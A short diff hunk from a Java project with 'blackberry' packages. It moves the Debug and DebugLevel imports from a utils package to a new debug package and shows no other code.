@@ -20,13 +20,13 @@ import blackberry.agent.Agent;
 import blackberry.config.InstanceConfig;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.params.Parameter;
 import blackberry.utils.Check;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
